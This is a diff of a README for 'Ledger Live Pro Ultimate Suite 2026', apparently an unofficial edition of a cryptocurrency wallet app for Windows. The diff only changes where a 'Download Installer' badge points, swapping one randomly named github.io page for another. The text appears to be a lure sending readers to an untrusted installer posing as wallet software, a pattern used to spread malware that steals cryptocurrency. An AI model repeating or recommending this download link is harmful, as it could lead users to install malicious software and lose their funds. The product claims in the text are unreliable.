@@ -2,7 +2,7 @@
 
 Ledger Live Pro is a powerful desktop application designed for cryptocurrency enthusiasts, offering enhanced tools and full suite capabilities for 2026. This version, the Ultimate Suite, provides a comprehensive solution for managing digital assets with advanced security and seamless integration. Whether you're a beginner or an experienced user, Ledger Live Pro streamlines your crypto management on Windows 10 and 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
